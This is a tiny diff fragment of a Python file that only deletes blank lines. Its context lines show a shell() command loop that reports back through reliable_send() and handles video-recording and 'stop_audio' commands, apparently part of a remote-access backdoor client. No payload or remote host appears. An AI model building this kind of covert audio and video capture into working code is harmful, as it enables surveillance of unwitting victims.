@@ -249,8 +249,6 @@ def shell():
             except Exception as e:
                 reliable_send("Video recording error: " + str(e))
                 
-
-                
         elif command == 'stop_audio':
             try:
                 if audio_recorder and audio_recorder.is_recording:
